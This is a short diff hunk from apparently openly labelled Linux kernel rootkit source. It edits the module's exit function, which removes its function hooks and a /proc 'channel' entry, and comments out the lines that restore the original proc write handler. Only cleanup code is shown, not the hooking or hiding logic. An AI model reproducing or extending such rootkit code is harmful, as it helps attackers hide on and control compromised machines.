@@ -672,8 +672,8 @@ static void __exit rootkit_exit(void) {
     static struct file_operations *proc_fops;
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     remove_proc_entry("channel", NULL);
-    proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
-    proc_fops->write = orig_write;
+    // proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
+    // proc_fops->write = orig_write;
     printk(KERN_INFO "rootkit: Unloaded :-(\n");
 }
 
